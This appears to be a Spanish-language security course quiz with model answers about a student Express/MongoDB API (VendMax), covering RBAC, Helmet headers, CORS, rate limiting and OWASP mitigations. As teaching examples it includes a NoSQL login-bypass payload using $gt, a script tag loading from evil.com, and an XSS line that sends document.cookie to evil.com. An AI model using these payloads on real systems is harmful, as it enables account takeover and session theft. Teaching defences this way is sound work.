# 🧠 Cuestionario de conocimiento — Semana 08

**Autorización y Seguridad** · 10 preguntas × 3 puntos = 30 puntos (30 % de la nota)

Las respuestas se apoyan en el código realmente entregado esta semana: los dos ejercicios de
`2-practicas/` y la API VendMax de `3-proyecto/`.

---

## 1. ¿Cuál es la diferencia entre autenticación y autorización? Da un ejemplo con Express

**Autenticación** responde a *¿quién eres?*: se verifica una identidad (contraseña, token,
certificado). **Autorización** responde a *¿qué puedes hacer?*: sobre una identidad ya verificada
se decide si esa persona puede ejecutar una acción concreta sobre un recurso concreto.

El orden es inamovible: no se puede autorizar a quien no se ha identificado.

| | Autenticación | Autorización |
|---|---|---|
| Pregunta | ¿Quién eres? | ¿Puedes hacer esto? |
| Falla con | **401** Unauthorized | **403** Forbidden |
| Se arregla | Iniciando sesión otra vez | No se arregla reintentando |
| En el código | `authMiddleware` | `requireRole`, comprobación de propiedad |

```ts
// routes/machine.routes.ts (proyecto VendMax)
router.delete('/:id',
  authMiddleware,            // AUTENTICACIÓN → sin JWT válido: 401
  requireRole('admin'),      // AUTORIZACIÓN  → con rol 'user': 403
  deleteMachine,
);
```

Caso real de la entrega: `operador@vendmax.co` se autentica correctamente y recibe su token. Al
intentar `DELETE /api/v1/machines/:id` obtiene **403**. Está perfectamente autenticado; lo que no
tiene es permiso. Un 401 ahí sería un error de diseño, porque mandaría al frontend a renovar un
token que está perfectamente bien.

---

## 2. ¿Cómo funciona RBAC? Define roles, recursos y permisos en el contexto de una API REST

RBAC (*Role-Based Access Control*) evita asignar permisos persona a persona: los permisos se
asocian a **roles**, y a cada usuario se le asigna un rol. Añadir un empleado nuevo es asignarle un
rol, no revisar cincuenta reglas.

Los tres elementos, en términos de una API REST:

- **Rol**: etiqueta que agrupa capacidades (`user`, `admin`). Vive en el documento del usuario y
  viaja firmada dentro del JWT.
- **Recurso**: aquello sobre lo que se actúa, normalmente una ruta y su entidad
  (`/api/v1/machines`, `/api/v1/machines/:id`).
- **Permiso**: la pareja *acción + recurso* que un rol tiene concedida (`admin` → `DELETE
  /machines/:id`).

En VendMax:

| Rol | Permisos |
|-----|----------|
| *(anónimo)* | `GET /machines`, `GET /machines/:id` (campos públicos) |
| `user` | lo anterior + `POST /machines` + `PATCH` **de sus propias** máquinas |
| `admin` | todo lo anterior sobre cualquier máquina + `DELETE`, retiro de recaudo y reportes |

Implementación en tres niveles, porque un solo middleware no cubre todos los casos:

```ts
// 1. Nivel ruta — ¿tu rol está en la lista?
router.delete('/:id', authMiddleware, requireRole('admin'), deleteMachine);

// 2. Nivel recurso — ¿este objeto es tuyo? (el middleware aún no sabe qué documento se tocará)
if (machine.createdBy !== requesterId && requesterRole !== 'admin')
  throw new AppError(403, 'Solo el operador que registró la máquina o un admin pueden editarla');

// 3. Nivel campo — ¿puedes VER este dato?
if (!isOwner && !isAdmin) return viewSinRecaudo;
```

El rol se comprueba **siempre en el servidor**. Si el frontend oculta el botón "Eliminar" eso es
cosmética; el control real es el middleware. Y el rol nunca se lee de un header o del body que
manda el cliente: se lee del JWT firmado, que el cliente no puede alterar sin romper la firma.

---

## 3. ¿Qué hace `helmet()` al aplicarlo en Express? Menciona 3 cabeceras que configura

`helmet()` es una colección de middlewares pequeños que ajustan las **cabeceras HTTP de
respuesta** para activar defensas que el navegador ya trae. No cambia la lógica de la aplicación:
cambia lo que el navegador tiene permitido hacer con esa respuesta. Con una línea
(`app.use(helmet())`) se aplican ~14 cabeceras y se **elimina** `X-Powered-By`.

Tres de las que se midieron en esta entrega (`curl -i` sobre `/api/v1/health`):

1. **`X-Content-Type-Options: nosniff`** — prohíbe al navegador "adivinar" el tipo de contenido.
   Sin ella, un archivo subido como `.txt` pero con JavaScript dentro podría acabar ejecutándose.
2. **`X-Frame-Options: SAMEORIGIN`** — impide que otra web meta la nuestra en un `<iframe>`, que
   es la base del *clickjacking* (superponer una capa invisible sobre botones reales).
3. **`Strict-Transport-Security: max-age=31536000; includeSubDomains`** — obliga al navegador a
   usar HTTPS durante un año, incluso si el usuario escribe `http://`.

También emite `Content-Security-Policy`, `Referrer-Policy: no-referrer`,
`Cross-Origin-Opener-Policy`, `X-DNS-Prefetch-Control: off`, `Origin-Agent-Cluster` y
`X-Permitted-Cross-Domain-Policies: none`, entre otras.

Un matiz importante: Helmet **no** sanea entradas ni sustituye a la validación. Es defensa en el
navegador; si la API guarda `<script>` sin filtrar, Helmet no lo impide (por eso Zod rechaza `<` y
`>` en los campos de texto de VendMax).

---

## 4. ¿Qué es `Content-Security-Policy` (CSP) y para qué sirve en una API?

CSP es una cabecera que declara **de dónde puede el navegador cargar y ejecutar recursos** en una
página: scripts, estilos, imágenes, fuentes, iframes. Todo lo que no esté en la lista se bloquea,
aunque el HTML lo pida. Es la mitigación más eficaz contra XSS: aunque un atacante consiga
inyectar `<script src="http://evil.com/x.js">`, el navegador se niega a descargarlo.

La política por defecto de Helmet, tal y como salió en la respuesta de VendMax:

```
Content-Security-Policy: default-src 'self'; base-uri 'self'; font-src 'self' https: data:;
  form-action 'self'; frame-ancestors 'self'; img-src 'self' data:; object-src 'none';
  script-src 'self'; script-src-attr 'none'; style-src 'self' https: 'unsafe-inline';
  upgrade-insecure-requests
```

**¿Y en una API que solo devuelve JSON?** CSP se aplica a documentos que el navegador renderiza, y
un JSON no ejecuta scripts, así que su efecto directo es limitado. Aun así se mantiene, por tres
razones:

1. Si algún endpoint devuelve HTML (una página de error, documentación tipo Swagger, un enlace de
   verificación), esa respuesta ya nace protegida.
2. Protege contra el escenario en que un navegador renderiza una respuesta de la API directamente
   (por ejemplo, al abrir la URL en una pestaña) y el `Content-Type` no llega correctamente.
3. Defensa en profundidad: una cabecera que no cuesta nada y cubre el caso inesperado.

Directivas clave: `default-src 'self'` (todo desde el propio origen), `object-src 'none'` (nada de
Flash/plugins), `frame-ancestors 'self'` (equivalente moderno de `X-Frame-Options`).

---

## 5. ¿Qué es `HSTS` y cuándo se activa? ¿Por qué no se aplica en HTTP?

**HSTS** (*HTTP Strict Transport Security*) es la cabecera
`Strict-Transport-Security: max-age=31536000; includeSubDomains`. Le dice al navegador: «durante
los próximos 31.536.000 segundos (un año), habla con este dominio **solo** por HTTPS». A partir de
ahí, si el usuario escribe `http://vendmax.co`, el navegador cambia a `https://` **antes** de
enviar nada por la red.

**Qué ataque evita:** el *SSL stripping*. En una red Wi-Fi hostil, el atacante intercepta la
primera petición HTTP y sirve una copia sin cifrar de la web. Con HSTS memorizado, esa primera
petición insegura ni siquiera sale del navegador.

**Cuándo se activa:** solo cuando el navegador recibe la cabecera **a través de una conexión HTTPS
válida**. Enviada por HTTP se ignora por completo, y con razón: si la conexión ya está intervenida,
el atacante podría inyectar o borrar la cabecera a su antojo, o usarla para dejar un dominio
inaccesible. La especificación exige ignorarla en claro.

Consecuencias prácticas:

- En desarrollo (`http://localhost`) la cabecera viaja pero el navegador la descarta. No estorba.
- En producción exige tener HTTPS bien resuelto **antes** de subir el `max-age`: durante ese año
  el navegador no aceptará volver a HTTP.
- Existe la *preload list* de Chrome/Firefox: dominios que se distribuyen ya marcados, de modo que
  la protección cubre incluso la primera visita.

---

## 6. ¿Cómo funciona `express-rate-limit`? ¿Qué diferencia hay entre un rate limit global y uno por ruta?

`express-rate-limit` cuenta peticiones por clave (por defecto la IP) dentro de una ventana de
tiempo. Guarda el contador en un *store* —en memoria por defecto— y cuando se supera el máximo
responde **429 Too Many Requests** sin llegar al controlador. En cada respuesta informa del estado
mediante cabeceras (`RateLimit-Limit`, `RateLimit-Remaining`, `RateLimit-Reset`).

```ts
export const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 100,   // toda la API
  standardHeaders: 'draft-6', legacyHeaders: true,
  message: { error: 'Too many requests, please try again later' },
});

export const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, max: 5,     // solo /login y /register
  skipSuccessfulRequests: false,
  message: { error: 'Too many login attempts, please try again later' },
});
```

| | Global (`app.use(globalLimiter)`) | Por ruta (`router.post('/login', authLimiter, ...)`) |
|---|---|---|
| Alcance | Todas las peticiones | Solo los endpoints elegidos |
| Límite | Holgado (100/15 min) | Estricto (5/15 min) |
| Objetivo | Scraping, abuso general, DoS básico | Fuerza bruta, credential stuffing |
| Coste de equivocarse | Demasiado bajo → usuarios legítimos bloqueados | Demasiado alto → contraseñas adivinables |

La combinación es lo que hace útil la defensa: **un límite único no puede ser a la vez cómodo para
navegar y estricto para el login**. Con 100 intentos cada 15 minutos un atacante prueba ~9.600
contraseñas al día; con 5, 480. Y un usuario real nunca necesita 6 intentos de login en un cuarto
de hora.

Se comprobó en la entrega que el bloqueo es quirúrgico: con `/auth/login` devolviendo 429,
`GET /api/v1/health` y `GET /api/v1/machines` seguían respondiendo 200.

Detalles de producción: el store en memoria no se comparte entre instancias (con varios procesos
hace falta `rate-limit-redis`), y detrás de un proxy o balanceador hay que configurar
`app.set('trust proxy', ...)` para no contar todas las peticiones bajo la IP del proxy.

---

## 7. ¿Qué es un `origin` en CORS y por qué `Access-Control-Allow-Origin: *` es peligroso en producción?

Un **origin** es la terna **esquema + host + puerto**: `https://app.vendmax.co:443`. Dos URLs son
del mismo origen solo si coinciden los tres. `http://localhost:5173` y `http://localhost:3001` son
orígenes **distintos** (distinto puerto), igual que `http://` y `https://` del mismo dominio.

El navegador aplica la *same-origin policy*: por defecto, el JavaScript de una web no puede leer
respuestas de otro origen. CORS es el mecanismo por el que el **servidor** declara qué orígenes
externos sí pueden leerlo, mediante `Access-Control-Allow-Origin`.

**Por qué `*` es peligroso**, sobre todo en una API con sesión:

1. Cualquier web del mundo puede leer las respuestas de la API desde el navegador de la víctima.
2. Con cookies de sesión (`httpOnly`), una página maliciosa podría lanzar peticiones autenticadas
   y **leer el resultado**: datos personales, listados, recaudos.
3. La propia especificación prohíbe combinar `*` con `credentials: true`. Quien "arregla" eso
   haciendo eco del `Origin` recibido está aceptando a todo el mundo, que es aún peor porque
   parece una whitelist y no lo es.
4. Deja de existir cualquier control sobre qué frontends consumen la API.

La configuración entregada:

```ts
const ALLOWED_ORIGINS = (process.env.CORS_ORIGINS ?? 'http://localhost:5173,http://localhost:3001')
  .split(',').map((o) => o.trim());

export const corsOptions: CorsOptions = {
  origin: (origin, callback) => {
    if (!origin || ALLOWED_ORIGINS.includes(origin)) callback(null, true);
    else callback(new Error(`CORS blocked: origin ${origin} not allowed`));
  },
  credentials: true,
  methods: ['GET', 'POST', 'PATCH', 'DELETE'],
};
```

Resultado medido: `http://localhost:5173` → 200 con `access-control-allow-origin` y
`allow-credentials: true`; `http://evil.com` → **403** y **sin** cabecera CORS.

Dos precisiones que se suelen confundir:

- Se permite la petición **sin** cabecera `Origin` (curl, Postman, servidor a servidor). CORS es
  una protección **del navegador para el usuario**, no un cortafuegos; bloquear ahí no añade
  seguridad y rompe las integraciones.
- CORS no protege la API: protege al usuario de que otras webs actúen en su nombre. Quien quiera
  atacar la API directamente usará curl, donde CORS sencillamente no existe. La autenticación y la
  autorización siguen siendo imprescindibles.

---

## 8. ¿Qué es NoSQL injection? ¿Cómo puede un atacante explotar `{ "$gt": "" }` en un login?

**NoSQL injection** es la inyección de **operadores de consulta** de MongoDB (`$gt`, `$ne`, `$in`,
`$regex`, `$where`) dentro de datos que la aplicación inserta tal cual en una query. No se inyecta
texto SQL: se inyecta **estructura**. El truco es que `req.body` de una petición JSON puede
contener objetos, no solo cadenas, y `findOne` acepta felizmente ese objeto como sub-consulta.

El ataque clásico contra un login:

```json
POST /api/v1/auth/login
{ "email": { "$gt": "" }, "password": { "$gt": "" } }
```

Sin defensas, el servicio ejecuta:

```js
User.findOne({ email: { $gt: '' } })   // "cualquier email mayor que la cadena vacía"
```

Es decir, **cualquier usuario**: Mongo devuelve el primero de la colección, muchas veces el
administrador. Si la comparación de contraseña también recibe un objeto, algunas implementaciones
mal escritas la dan por válida y el atacante entra **sin conocer ni un email ni una contraseña**.
Variantes habituales: `{"$ne": null}` (distinto de nulo → cualquiera) y `{"$regex": "^adm"}` para
enumerar cuentas letra a letra.

Tres defensas en cadena, todas presentes en la entrega:

1. **`express-mongo-sanitize`** elimina las claves que empiezan por `$` o contienen `.` en `body`,
   `query` y `params`. `{ "$gt": "" }` se convierte en `{}`.
2. **Validación con Zod**: `z.string().email()` rechaza cualquier cosa que no sea una cadena, así
   que un objeto ni siquiera llega al servicio.
3. **Comparación con bcrypt**: `bcrypt.compare` exige una cadena; nunca hay una igualdad directa
   contra el hash.

Resultado real de esa petición contra VendMax:

```
HTTP/1.1 400 Bad Request
{"error":"Validation failed","details":{"email":"Invalid email"}}
```

Nunca un 200, nunca un token.

---

## 9. ¿Qué es XSS (Cross-Site Scripting)? ¿Cómo afecta a una API REST vs una aplicación web?

**XSS** es la ejecución de JavaScript ajeno en el navegador de la víctima, dentro del contexto de
confianza de un sitio. Como el código corre "desde" ese sitio, puede leer el DOM, robar tokens de
`localStorage`, hacer peticiones autenticadas o suplantar la interfaz. Tipos: **almacenado** (el
payload queda en la base de datos y afecta a todo el que lo vea), **reflejado** (viaja en la URL) y
**basado en DOM** (el fallo está en el JavaScript del cliente).

| | Aplicación web (renderiza HTML) | API REST (devuelve JSON) |
|---|---|---|
| Ejecución directa | Sí: el HTML inyectado se ejecuta | No: un JSON no ejecuta nada |
| Papel de la API | — | Puede **almacenar y servir** el payload |
| Impacto | Robo de sesión, defacement, keylogging | Se convierte en el vehículo del XSS del frontend |
| Defensas | Escapado en plantillas, CSP, sanitizado | Validar la entrada, `Content-Type: application/json`, `nosniff`, cookies `httpOnly` |

La idea clave: una API REST no sufre XSS, pero **lo propaga**. Si VendMax guardase
`"location": "<script>fetch('http://evil.com?c='+document.cookie)</script>"` y el panel de
administración pintase ese campo con `innerHTML`, el ataque se ejecutaría en el navegador de cada
administrador. La API sería la despensa del atacante.

Por eso en el proyecto los campos de texto rechazan `<` y `>` en el propio schema:

```ts
const noHtml = /^[^<>]*$/;
modelName: z.string().min(2).max(120).regex(noHtml, 'El modelo no puede contener caracteres HTML'),
```

Comprobado: `POST /api/v1/machines` con `"modelName": "<script>alert(1)</script>"` → **400**.

Medidas complementarias ya activas: cookies `httpOnly` (el JavaScript inyectado no puede leer el
refresh token), `X-Content-Type-Options: nosniff` y CSP vía Helmet, y respuestas siempre con
`Content-Type: application/json`.

---

## 10. Menciona 3 vulnerabilidades del OWASP Top 10 y cómo se mitigan con las herramientas vistas esta semana

### A01:2021 — Broken Access Control

La número uno del ranking. Un usuario accede a datos o acciones que no le corresponden: cambiar el
`id` de la URL y ver el recurso de otro (*IDOR*), llamar a un endpoint de administración sin ser
admin, o confiar en que el frontend oculte el botón.

Mitigación aplicada:

- `authMiddleware` en toda ruta que no sea explícitamente pública.
- `requireRole('admin')` en `DELETE`, retiro de recaudo y reportes.
- Comprobación de **propiedad** en el servicio: `PATCH` solo lo hace el dueño o un admin
  → un operador editando la máquina de otro recibe **403**.
- Autorización **a nivel de campo**: el recaudo (`cashBalanceCents`) solo se serializa para el
  dueño o el admin.
- *Fail-safe defaults*: `router.use(authMiddleware)` a nivel de router, para que una ruta nueva
  nazca protegida.

### A03:2021 — Injection

Incluye SQL, NoSQL, comandos y LDAP. En este stack, el vector es NoSQL injection mediante
operadores de MongoDB.

Mitigación aplicada: `express-mongo-sanitize` limpiando `$` y `.`, Zod validando tipo, formato,
longitud y **rechazando campos no declarados** (lo que además corta el *mass assignment*: nadie
cuela `role: "admin"` ni `cashBalanceCents` en un POST), y consultas siempre a través de Mongoose
con tipos definidos. Verificado: `{"$gt":""}` en el login devuelve 400, no un token.

### A07:2021 — Identification and Authentication Failures

Contraseñas débiles o mal guardadas, sesiones eternas, y sobre todo **ausencia de límite de
intentos**, que deja la puerta abierta a la fuerza bruta y al credential stuffing.

Mitigación aplicada: `authLimiter` de 5 intentos / 15 min en `/login` y `/register` (verificado:
429 al sexto intento), bcrypt con 12 rondas, access token de 15 minutos, refresh token de 7 días en
cookie `httpOnly` + `sameSite`, mensaje de error **idéntico** para email inexistente y contraseña
incorrecta (evita enumerar usuarios) y secretos JWT fuera del código, en `.env`.

### Mención extra — A05:2021 Security Misconfiguration

Es la que cubren Helmet y el manejador de errores: cabeceras de seguridad ausentes, `X-Powered-By`
anunciando el stack, CORS con `*` y respuestas de error con `stack trace` (que revelan rutas
absolutas, dependencias y versiones). En la entrega: `helmet()` activo, CORS con whitelist y un
`errorHandler` centralizado que registra el detalle en el servidor y devuelve al cliente
`{"error":"Internal server error"}` y nada más.

| Vulnerabilidad OWASP | Herramienta de la semana | Verificado en |
|---|---|---|
| A01 Broken Access Control | `requireRole`, dueño-o-admin, serialización por rol | 403 del operador no dueño |
| A03 Injection | `express-mongo-sanitize` + Zod | login con `$gt` → 400 |
| A05 Security Misconfiguration | `helmet()`, CORS whitelist, `errorHandler` | cabeceras medidas con curl |
| A07 Auth Failures | `express-rate-limit`, bcrypt, JWT corto | 429 al sexto login |
